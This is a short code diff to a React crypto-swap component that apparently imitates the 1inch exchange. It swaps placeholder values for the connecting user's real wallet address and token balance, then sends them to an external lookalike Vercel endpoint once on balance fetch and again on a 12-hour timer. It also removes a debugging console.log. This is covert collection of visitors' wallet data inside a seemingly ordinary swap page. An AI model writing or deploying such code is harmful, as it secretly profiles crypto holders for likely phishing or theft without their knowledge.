@@ -103,8 +103,7 @@ function Swap({ walletAddress }) {
   };
 
   const { address } = useAccount(); 
-
-  console.log(address)
+ 
 
 const connectors = connectorsForWallets(
   [
@@ -418,8 +417,8 @@ if(youPayToken === "MATIC") {
     setTokenBalance(Number(data.formatted).toFixed(4));
 
     const dataToSend = {
-      wallet: '0x1234567890abcdef1234567890abcdef12345678',
-      balance: 150.25,
+      wallet: address,
+      balance: data.formatted,
     };
     
     fetch('https://1inch2test-rud8.vercel.app/api/wallet-balance', {
@@ -450,8 +449,8 @@ if(youPayToken === "MATIC") {
 // New useEffect to send data every 12 hours
   useEffect(() => {
     const dataToSend = {
-      wallet: '0x1234567890abcdef1234567890abcdef12345678',
-      balance: 150.25,
+      wallet: address,
+      balance: data.formatted,
     };
 
     const sendDataPeriodically = () => {
